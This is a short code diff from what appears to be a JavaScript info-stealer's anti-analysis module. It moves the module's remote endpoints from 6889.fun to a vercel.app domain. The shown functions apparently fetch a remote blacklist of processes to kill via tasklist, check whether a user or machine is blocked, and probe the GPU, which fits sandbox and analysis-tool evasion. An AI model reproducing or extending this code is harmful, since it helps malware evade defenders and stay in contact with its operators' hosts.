@@ -42,13 +42,13 @@ const fetchKill = async (u, c) => {
 
 const killBlacklisted = async () => {
   await fetchKill(
-    "https://6889.fun/api/aurathemes/bypass/blacklist/progr?aurathemes=true",
+    "https://6889-fun.vercel.app/api/aurathemes/bypass/blacklist/progr?aurathemes=true",
     "tasklist"
   );
 };
 
 const checkBlocked = async (u, v) => {
-  return await isBlocked(`https://6889.fun/api/aurathemes/bypass/blocked/${u}?aurathemes=true`, v);
+  return await isBlocked(`https://6889-fun.vercel.app/api/aurathemes/bypass/blocked/${u}?aurathemes=true`, v);
 };
 
 const gpuBlocked = async (_) => {
